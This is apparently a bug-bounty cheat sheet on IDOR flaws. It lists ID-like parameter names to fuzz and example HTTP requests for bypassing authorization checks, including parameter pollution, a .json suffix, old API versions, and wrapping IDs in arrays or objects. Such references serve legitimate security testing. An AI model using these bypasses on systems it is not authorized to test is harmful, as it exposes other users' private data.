# IDOR

## Basics

```text
Check for valuable words:
{regex + perm} id
{regex + perm} user
{regex + perm} account
{regex + perm} number
{regex + perm} order
{regex + perm} no
{regex + perm} doc
{regex + perm} key
{regex + perm} email
{regex + perm} group
{regex + perm} profile
{regex + perm} edit
```

## Bypasses

* Add parameters onto the endpoints for example, if there was

```text
GET /api_v1/messages --> 401
vs 
GET /api_v1/messages?user_id=victim_uuid --> 200
```

* HTTP Parameter pollution

```text
GET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized
GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK

GET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]
```

* Add .json to the endpoint, if it is built in Ruby!

```text
/user_data/2341 --> 401 Unauthorized
/user_data/2341.json --> 200 OK
```

* Test on outdated API Versions

```text
/v3/users_data/1234 --> 403 Forbidden
/v1/users_data/1234 --> 200 OK
```

Wrap the ID with an array.

```text
{“id”:111} --> 401 Unauthriozied
{“id”:[111]} --> 200 OK
```

Wrap the ID with a JSON object:

```text
{“id”:111} --> 401 Unauthriozied

{“id”:{“id”:111}} --> 200 OK
```

JSON Parameter Pollution:

```text
POST /api/get_profile
Content-Type: application/json
{“user_id”:<legit_id>,”user_id”:<victim’s_id>}
```

